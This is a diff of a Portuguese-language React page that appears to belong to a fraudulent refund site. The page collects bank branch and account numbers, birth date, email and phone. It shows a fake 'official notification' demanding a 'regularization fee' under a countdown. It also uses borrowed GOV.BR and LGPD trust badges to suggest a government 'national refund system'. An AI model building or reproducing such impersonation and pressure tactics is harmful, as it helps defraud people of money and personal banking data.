+                      estado: estado,
+                      nasc: dataNascimento,
+                      agencia: urlParams.get('agencia') || "",
+                      conta: urlParams.get('conta') || "",
+                      email: email,
+                      telefone: telefone
+                    });
+                    
+                    toast({
+                      title: "Redirecionando...",
+                      description: "Você será redirecionado para a próxima etapa.",
+                      variant: "default"
+                    });
+                    
+                    // Redirecionar para a página de taxa complementar
+                    setTimeout(() => {
+                      navigate(`/taxa-complementar?${params.toString()}`);
+                    }, 1000);
+                  }}
+                >
+                  <div className="flex items-center justify-center">
+                    <ArrowRight className="mr-2 h-5 w-5" />
+                    Avançar para próxima etapa
+                  </div>
+                </Button>
+                
+                <div className="bg-red-600 p-4 rounded-lg text-white shadow-sm">
+                  <div className="flex items-center mb-2">
+                    <AlertTriangle className="h-5 w-5 text-white mr-2" />
+                    <h3 className="font-bold text-base">NOTIFICAÇÃO OFICIAL</h3>
+                  </div>
+                  <p className="mb-3 text-sm">
+                    Ao prosseguir, você concordou com o pagamento da Taxa de Regularização no valor de <strong>{valorTaxaFormatado}</strong>. 
+                    O não pagamento resultará em <strong>cancelamento automático</strong> da sua solicitação.
+                  </p>
+                  <div className="bg-white/10 p-2 rounded-md">
+                    <p className="font-medium text-sm text-center">
+                      Efetue o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> 
+                      <br className="md:hidden" /> para garantir sua restituição de <strong>{valorFormatado}</strong>
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          {/* Seção de Garantia de Segurança - Simplificada */}
+          <div className="mb-4">
+            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
+              <div className="flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
+                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
+              </div>
               
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
-                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
-                  <div className="flex items-start">
-                    <div className="flex-shrink-0 mt-1">
-                      <CheckCircle className="h-5 w-5 text-green-600" />
-                    </div>
-                    <p className="ml-3 text-green-800 font-medium">
-                      Conformidade com a LGPD (Lei Geral de Proteção de Dados)
-                    </p>
-                  </div>
+              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Conformidade com a LGPD</span>
                 </div>
-                
-                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
-                  <div className="flex items-start">
-                    <div className="flex-shrink-0 mt-1">
-                      <CheckCircle className="h-5 w-5 text-green-600" />
-                    </div>
-                    <p className="ml-3 text-green-800 font-medium">
-                      Consultas criptografadas com tecnologia GOV.BR
-                    </p>
-                  </div>
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Tecnologia GOV.BR</span>
                 </div>
-                
-                <div className="bg-white p-4 rounded-lg border border-green-200 shadow-sm">
-                  <div className="flex items-start">
-                    <div className="flex-shrink-0 mt-1">
-                      <CheckCircle className="h-5 w-5 text-green-600" />
-                    </div>
-                    <p className="ml-3 text-green-800 font-medium">
-                      Registro no sistema nacional de restituição tarifária
-                    </p>
-                  </div>
+                <div className="flex items-center">
+                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
+                  <span>Sistema nacional de restituição</span>
                 </div>
               </div>
             </div>
